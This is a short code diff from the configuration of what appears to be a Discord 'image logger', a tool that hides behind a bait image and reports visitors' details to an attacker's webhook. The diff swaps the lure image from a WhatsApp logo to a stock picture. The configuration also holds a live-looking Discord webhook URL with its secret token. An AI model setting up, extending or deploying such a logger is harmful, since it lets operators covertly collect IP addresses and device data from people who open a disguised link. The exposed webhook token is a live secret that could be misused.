@@ -12,7 +12,7 @@ __author__ = "M3D"
 config = {
     # BASE CONFIG #
     "webhook": "https://ptb.discord.com/api/webhooks/1437918673347280938/LF-DQTY6E_mVQ4ZaxOteWik52uRjbdFWHnzkLNxEl-fdOTtzUK5hjawIWQKdT62KnPEh",
-    "image": "https://w7.pngwing.com/pngs/110/230/png-transparent-whatsapp-application-software-message-icon-whatsapp-logo-whats-app-logo-logo-grass-mobile-phones-thumbnail.png", # You can also have a custom image by using a URL argument
+    "image": "https://www.shutterstock.com/image-vector/really-good-big-finger-image-260nw-498076033.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
